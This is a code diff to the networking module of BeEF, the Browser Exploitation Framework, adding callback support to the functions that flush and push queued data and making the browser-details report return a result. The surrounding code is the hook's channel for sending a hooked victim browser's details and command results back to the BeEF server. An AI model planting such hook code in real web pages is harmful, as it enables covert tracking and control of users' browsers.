@@ -1,5 +1,5 @@
 //
-// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - http://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
@@ -144,7 +144,7 @@ beef.net = {
      * XHR-polling mechanism. If WebSockets are used, the data is sent
      * back to BeEF straight away.
      */
-    flush: function () {
+    flush: function (callback) {
         if (this.cmd_queue.length > 0) {
             var data = beef.encode.base64.encode(beef.encode.json.stringify(this.cmd_queue));
             this.cmd_queue.length = 0;
@@ -162,7 +162,11 @@ beef.net = {
                     stream.packets.push(packet);
                 }
                 stream.pc = stream.packets.length;
-                this.push(stream);
+                this.push(stream, callback);
+            }
+        } else {
+            if ((typeof callback != 'undefined') && (callback != null)) {
+                callback();
             }
         }
     },
@@ -182,10 +186,18 @@ beef.net = {
      * It uses beef.net.request to send back the data.
      * @param: {Object} stream: the stream object to be sent back.
      */
-    push: function (stream) {
+    push: function (stream, callback) {
         //need to implement wait feature here eventually
+        if (typeof callback === 'undefined') {
+            callback = null;
+        }
         for (var i = 0; i < stream.pc; i++) {
-            this.request(this.httpproto, 'GET', this.host, this.port, this.handler, null, stream.get_packet_data(), 10, 'text', null);
+            var cb = null;
+            if (i == (stream.pc - 1)) {
+                cb = callback;
+            }
+            this.request(this.httpproto, 'GET', this.host, this.port, this.handler, null, 
+                    stream.get_packet_data(), 10, 'text', cb);
         }
     },
 
@@ -490,8 +502,13 @@ beef.net = {
      */
     browser_details: function () {
         var details = beef.browser.getDetails();
+        var res = null;
         details['HookSessionID'] = beef.session.get_hook_session_id();
         this.send('/init', 0, details);
+        if(details != null)
+            res = true;
+
+        return res;
     }
 
 };
